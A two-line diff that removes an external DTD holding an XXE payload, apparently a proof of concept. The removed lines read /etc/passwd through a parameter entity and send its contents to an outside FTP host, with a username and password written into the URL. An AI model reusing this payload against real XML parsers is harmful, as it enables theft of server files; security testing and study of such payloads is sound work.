@@ -1,2 +1,0 @@
-<!ENTITY % three SYSTEM "file:///etc/passwd">
-<!ENTITY % two "<!ENTITY four SYSTEM 'ftp://u110276bab:Welcome2@unclebenz.sharefileftp.com/poc/%three;'>">
